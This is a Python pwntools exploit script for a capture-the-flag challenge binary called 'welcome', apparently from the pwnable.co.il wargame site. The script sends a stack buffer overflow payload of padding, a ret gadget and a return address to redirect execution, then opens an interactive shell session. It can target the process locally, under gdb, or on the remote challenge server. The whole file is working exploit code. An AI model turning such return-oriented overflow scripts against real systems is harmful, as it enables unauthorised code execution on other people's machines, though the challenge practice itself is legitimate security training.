from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"
# context.log_level="debug"

binary_name = "welcome"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


# libc="/home/Ningen/Desktop/Linux-Machine/Pwnable.kr/LibCs/"  # This is the pwnable.kr libcs directory. Choose properly between 32 and 64 bit libcs.
REMOTE = "nc pwnable.co.il 9000"

context.binary = e

def main():
    libc=e.libc 
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            ip, port = REMOTE.replace("nc ", "").split(" ")
            port = int(port)
            p = remote(ip, port)

        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x40076C", aslr=False)
        else:
            p = process(f"./{binary_name}")

    # gadgets
    ret= 0x40057e
    pop_rdi =0x4007cb
    system_plt =0x4005A0

    payload = b"A"*40
    payload +=p64(ret)+p64(0x400708)
    p.sendline(payload)
    p.interactive()

main()

